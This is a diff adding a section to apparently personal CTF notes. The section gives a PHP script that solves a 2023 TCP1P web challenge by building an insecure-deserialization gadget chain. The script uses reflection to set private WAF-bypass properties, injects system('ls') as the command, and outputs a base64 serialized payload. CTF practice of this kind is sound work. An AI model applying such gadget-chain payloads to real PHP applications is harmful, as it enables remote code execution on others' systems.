@@ -233,6 +233,53 @@ class PositionAnalyzer {
     }
 }
 ```
+-------------
+
+### TCP1P Old Ctf
+
+--------------
+
+- Dealing with private functions, [source code](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Web/Un%20Secure/dist.zip)
+
+```php
+<?php
+require('vendor/autoload.php');
+
+$gadgetone = new \GadgetOne\Adders(1);
+$gadgettwo =  new \GadgetTwo\Echoers();
+$gadgetthree = new \GadgetThree\Vuln();
+
+//Setup gadget1
+$vuln = new \GadgetThree\Vuln();
+$reflection = new \ReflectionClass($gadgetthree);
+$property = $reflection->getProperty('waf1');
+$property->setAccessible(true);
+$property->setValue($vuln,1);
+$property = $reflection->getProperty('waf2');
+$property->setAccessible(true);
+$property->setValue($vuln,"\xde\xad\xbe\xef");
+$property = $reflection->getProperty('waf3');
+$property->setAccessible(true);
+$property->setValue($vuln,false);
+$vuln->cmd = "system('ls');";
+
+//Gadget two
+$echoers = new \GadgetOne\Adders(1);
+$reflection = new \ReflectionClass($echoers);
+$property = $reflection->getProperty('x');
+$property->setAccessible(true);
+$property->setValue($echoers,$vuln);
+
+//setup trigger point __destruct
+$trigger = new \GadgetTwo\Echoers();
+$reflection =  new \ReflectionClass($trigger);
+$property = $reflection->getProperty("klass");
+$property->setAccessible(true);
+$property->setValue($trigger,$echoers);
+
+echo base64_encode(serialize($trigger));
+?>
+```
 
 ---------------
 
